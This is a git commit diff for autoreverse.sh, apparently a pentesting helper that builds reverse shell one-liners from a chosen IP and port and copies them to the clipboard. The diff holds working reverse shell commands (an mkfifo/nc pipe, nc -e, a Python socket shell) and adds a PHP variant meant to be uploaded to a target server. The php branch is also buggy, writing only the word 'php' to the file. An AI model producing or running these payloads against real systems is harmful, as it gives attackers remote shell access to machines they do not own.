1bfaa5cbc89812ab570cd4f5bbba34fa8b3c04d8
CronoX1 <91015518+CronoX1@users.noreply.github.com>
2021-11-06 11:02:02 +0100

    Update autoreverse.sh

--- autoreverse.sh
+++ autoreverse.sh
@@ -1,6 +1,8 @@
 #!/bin/bash
 
+
 #Definition of colours to make the display beautiful:)
+
 
 boring="\e[0m" #no colour
 red="\e[1;31m"
@@ -33,7 +35,7 @@ echo ""
 #PentestMonkey Reverse Shell Options
 
 
-echo -ne "${blue}Which type of reverse shell command line do you want to use? (rm, bash, nc or python):${boring} " && read reverse
+echo -ne "${blue}Which type of reverse shell command line do you want to use? (rm, bash, nc, python or php):${boring} " && read reverse
 
 rm="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
 
@@ -43,6 +45,8 @@ nc="nc -e /bin/sh $IP $PORT"
 
 python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
 
+php='<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '$IP' '$PORT' >/tmp/f") ?>'
+
 
 #Display of the reverse shell
 
@@ -51,32 +55,43 @@ clear
 
 echo ""
 
-echo -ne "${green}This is your shell command line!!${boring}\n"
+if [ $reverse != "php" ] && [ $reverse != "all" ]; then
+echo -ne "${green}This is your reverse shell command line!!${boring}\n"
+fi
+
+if [ $reverse = "all" ]; then
+echo -ne "${green}Those are your reverse shells command lines${boring}\n"
+fi
+
+if [ $reverse = "php" ]; then
+echo "php" > reverse.php | echo -ne "${red}The file reverse.php is ready to upload and located in ${green}" ; pwd
+fi
 
 echo ""
 
+if [ "$reverse" = "all" ];then
+echo -ne "\n${purple} [+] ${blue}rm ${boring}= ${green}$rm \n\n ${purple}[+] ${blue}bash = ${green}$bash ${purple} \n\n [+] ${blue}nc = ${green}$nc \n\n ${purple}[+] ${blue}python = ${green}$python \n\n ${purple}[+] ${blue}php = ${green}$php"
+fi
+
 if [ "$reverse" = "rm" ]; then
-echo -ne $rm | xclip | echo -ne ${red}$rm${boring}
+echo -ne $rm | xclip -sel clip | echo -ne "${red}$rm${boring}\n\n"
 fi
 
 if [ "$reverse" = "bash" ]; then
-echo $bash | xclip | echo -ne ${red}$bash${boring}
+echo $bash | xclip -sel clip | echo -ne "${red}$bash${boring}\n\n"
 fi
 
 if [ "$reverse" = "nc" ]; then
-echo $nc | xclip | echo -ne ${red}$nc${boring}
+echo $nc | xclip -sel clip | echo -ne "${red}$nc${boring}\n\n"
 fi
 
 if [ "$reverse" = "python" ]; then
-echo $python | xclip | echo -ne ${red}$python${boring}
+echo $python | xclip -sel clip | echo -ne "${red}$python${boring}\n\n"
 fi
 
-echo ""
-echo ""
-
-echo -ne "${green}We have copied it for you!!! Paste it wherever you want:)${boring}\n"
-
-echo ""
+if [ "$reverse" != "php" ] && [ "$reverse" != "all" ]; then
+echo -ne "${green}We have copied it for you!!! Paste it wherever you want:)${boring}\n\n"
+fi
 
 
 #Display of the listener (netcat)
